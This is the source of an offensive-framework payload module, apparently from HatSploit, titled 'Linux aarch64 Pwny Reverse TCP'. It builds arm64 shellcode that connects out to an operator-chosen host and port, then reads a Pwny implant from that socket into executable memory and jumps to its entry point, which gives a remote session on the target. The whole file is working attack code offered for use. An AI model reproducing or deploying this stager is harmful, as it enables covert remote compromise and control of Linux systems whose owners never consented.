"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny import Pwny
from pwny.session import PwnySession

from pex.assembler import Assembler
from pex.exe.elf import ELF

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload, Handler, Pwny, Assembler, ELF):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux aarch64 Pwny Reverse TCP",
            'Payload': "linux/aarch64/pwny_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Description': "Linux aarch64 (arm64) Pwny Reverse TCP",
            'Arch': ARCH_AARCH64,
            'Platform': OS_LINUX,
            'Session': PwnySession,
            'Rank': "high",
            'Type': "reverse_tcp"
        }

    def implant(self):
        implant = self.get_implant(
            platform=self.details['Platform'],
            arch=self.details['Arch']
        )

        length = len(implant)
        entry = self.elf_header(implant)['e_entry']

        return self.assemble(
            self.details['Arch'],
            f"""
            setup:
                ldr x2, ={hex(length)}
                mov x10, x2

                lsr x2, x2, 0xc
                add x2, x2, 1
                lsl x2, x2, 0xc

                mov x0, xzr
                mov x1, x2
                mov x2, 6
                mov x3, 0x22
                mov x4, xzr
                mov x5, xzr
                mov x8, 0xde
                svc 0

                mov x4, x10
                mov x3, x0
                mov x10, x0

            read:
                mov x0, x12
                mov x1, x3
                mov x2, x4
                mov x8, 0x3f
                svc 0

                cbz w0, fail
                add x3, x3, x0
                subs x4, x4, x0
                bne read

                adr x0, entry
                ldr x0, [x0]
                add x0, x0, x10
                mov x14, x0

                mov x0, sp
                and sp, x0, -0x10
                add sp, sp, 0x60

                mov x0, 2
                mov x1, 0x70
                str x1, [sp]
                mov x1, sp

                mov x2, x12
                mov x3, 0
                mov x4, 0
                mov x5, 7
                mov x6, x10
                mov x7, 6
                mov x8, 0x1000
                mov x9, 0x19
                mov x11, 0

                stp x10, x11, [sp, -0x10]!
                stp x8, x9, [sp, -0x10]!
                stp x6, x7, [sp, -0x10]!
                stp x4, x5, [sp, -0x10]!
                stp x2, x3, [sp, -0x10]!
                stp x0, x1, [sp, -0x10]!

                mov x29, 0
                mov x30, 0
                br x14

            fail:
                mov x0, 0
                mov x8, 0x5d
                svc 0

            entry:
                .word {hex(entry)}
            """
        )

    def run(self):
        return self.assemble(
            self.details['Arch'],
            f"""
            bl start

            addr:
                .short 0x2
                .short 0x{self.rport.little.hex()}
                .word 0x{self.rhost.little.hex()}

            start:
                mov x0, 0x2
                mov x1, 0x1
                mov x2, 0
                mov x8, 0xc6
                svc 0
                mov x12, x0

                adr x1, addr
                mov x2, 0x10
                mov x8, 0xcb
                svc 0
            """
        ) + self.implant()
